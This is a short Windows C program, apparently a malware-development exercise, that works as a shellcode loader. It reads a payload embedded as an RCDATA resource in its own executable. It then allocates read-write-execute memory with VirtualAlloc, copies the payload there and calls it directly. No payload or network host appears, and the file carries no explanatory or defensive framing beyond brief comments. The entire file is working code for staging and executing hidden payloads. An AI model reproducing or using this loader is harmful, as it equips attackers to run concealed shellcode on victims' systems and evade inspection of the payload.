#include <Windows.h>
#include <stdio.h>
#include "resource.h"

int main() {

	HRSRC hRsrc = NULL;
	HGLOBAL hGlobal = NULL;
	PVOID pPayloadAddress = NULL;
	SIZE_T sPayloadSize = 0;

	//Get the location of the resource
	hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
	if (hRsrc == NULL) {
		//If the function fails
		printf("FindResourceW did not work %d \n", GetLastError());
		return -1;
	}
	//Get HGLOBAL
	hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL) {
		//If the function fails
		printf("LoadResource did not work %d \n", GetLastError());
		return -1;
	}
	//
	pPayloadAddress = LockResource(hGlobal);
	if (pPayloadAddress == NULL) {
		//If the function fails
		printf("LockResource did not work %d \n", GetLastError());
		return -1;
	}
	//
	sPayloadSize = SizeofResource(NULL, hRsrc);
	if (sPayloadSize == 0) {
		//If the function fails
		printf("SizeofResource did not work %d \n", GetLastError());
		return -1;
	}
	//Print the address and payload size
	printf("pPayloadAddress %p \n", pPayloadAddress);
	printf("sPayloadSize %ld \n", sPayloadSize);
	
	//Making mememory executable
	LPVOID execmem = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (execmem == NULL) {
		//If the function fails
		printf("VirtualAlloc did not work %d \n", GetLastError());
		return -1;
	}
	//
	memcpy(execmem, pPayloadAddress, sPayloadSize);
	//
	((void(*)())execmem)();

	printf("Press Enter to quit ...");
	getchar();
	return 0;

}